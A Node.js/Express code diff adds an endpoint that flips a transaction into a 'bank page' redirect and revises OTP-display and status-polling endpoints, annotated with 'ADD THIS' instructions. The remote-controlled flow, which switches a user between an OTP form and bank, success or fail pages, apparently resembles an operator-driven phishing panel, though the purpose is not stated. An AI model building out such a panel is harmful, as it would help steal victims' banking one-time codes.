@@ -167,6 +167,56 @@ app.post('/api/updateRedirectStatus', (req, res) => {
   });
 });
 
+// ADD THIS NEW ENDPOINT
+app.post('/api/redirectToBankPage', (req, res) => {
+  const { invoiceId } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) {
+    return res.status(404).json({ status: "error", message: "Transaction not found" });
+  }
+  txn.redirectStatus = 'bankpage';
+  console.log(`Transaction ${invoiceId} redirected to bank page`);
+  res.json({ status: "success", message: "Redirecting to bank page" });
+});
+
+// MODIFY THIS EXISTING ENDPOINT (find checkTransactionStatus)
+app.get('/api/checkTransactionStatus', (req, res) => {
+  const { invoiceId } = req.query;
+  const txn = transactions.get(invoiceId);
+  if (!txn) {
+    return res.status(404).json({ status: "error", message: "Transaction details not found" });
+  }
+  if (txn.status === 'otp_pending' && txn.otpShown) {
+    return res.json({ status: "show_otp", message: "Show OTP form to user", otpError: txn.otpError });
+  }
+  if (txn.redirectStatus) {
+    let redirectUrl;
+    if (txn.redirectStatus === 'success') {
+      redirectUrl = `/success.html?invoiceId=${invoiceId}`;
+    } else if (txn.redirectStatus === 'fail') {
+      redirectUrl = `/fail.html?invoiceId=${invoiceId}`;
+    } else if (txn.redirectStatus === 'bankpage') { // ADD THIS NEW CONDITION
+      redirectUrl = `/bankpage.html?invoiceId=${invoiceId}`;
+    }
+    return res.json({ status: "redirect", redirectUrl });
+  }
+  res.json({ status: txn.status, otpError: txn.otpError });
+});
+
+// MODIFY THIS EXISTING ENDPOINT (find showOTP)
+app.post('/api/showOTP', (req, res) => {
+  const { invoiceId } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) {
+    return res.status(404).json({ status: "error", message: "Transaction not found" });
+  }
+  txn.otpShown = true;
+  txn.status = 'otp_pending';
+  txn.otpError = false;
+  txn.redirectStatus = null; // ADD THIS LINE TO CLEAR REDIRECT STATUS
+  res.json({ status: "success", message: "OTP form will be shown to user" });
+});
+
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
